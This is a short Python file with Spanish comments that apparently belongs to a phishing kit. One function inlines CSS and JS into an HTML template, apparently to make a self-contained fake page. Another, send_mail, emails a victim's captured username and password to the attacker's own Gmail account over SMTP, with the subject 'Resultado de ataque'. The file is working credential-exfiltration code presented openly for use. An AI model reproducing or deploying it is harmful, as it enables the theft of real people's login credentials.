import re
import smtplib
from email.mime.text import MIMEText
from os.path import join as path_join
from email.mime.multipart import MIMEMultipart

def zip_template(template:str, template_folder:str)->str:
    """Incrusta los archivos JS y CSS externos y retorna una plantilla"""
    reg = re.compile(r'href="/static/css/\w+.\w+|src="/static/js/\w+.\w+')
    for enlace in reg.finditer(template):
        enlace = enlace.group()
        path_folder = path_join(template_folder, "..")

        if enlace.endswith(".css"):
            css = open(path_join(path_folder, enlace[enlace.index("=")+3:]))
            content = f'<style type="text/css">\n{css.read()}\n</style>'
            i = template.index("<body>")
            template = f"{template[:i+7]}{content}{template[i+6:]}"
            css.close()
        elif enlace.endswith(".js"):
            js = open(path_join(path_folder, enlace[enlace.index("=")+3:]))
            content = f"<script>\n{js.read()}\n</script>"
            i = template.index("/script>")
            template = f"{template[:i+8]}{content}{template[i+7:]}"
    return template

def send_mail(email:str, application_password:str, username:str, password:str)->bool:
    """
    Envia un correo a ti mismo con las credenciales de la victima
    
    Parameters:
    :mail --> tu email
    :application_password --> tu cotraseña de aplicacion 
    :username--> username de la victima
    :password --> contraseña de la victima

    :return boolean
    """

    message = f"username: {username}\npassword: {password}"

    msg = MIMEMultipart()
    msg["From"] = email
    msg["To"] = email
    msg["Subject"] = "Resultado de ataque"

    msg.attach(MIMEText(message, 'plain'))

    try: 
        server = smtplib.SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.login(msg['From'], application_password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
        print("Correo enviado")
        return True
    except Exception as e: 
        print(e)
        return False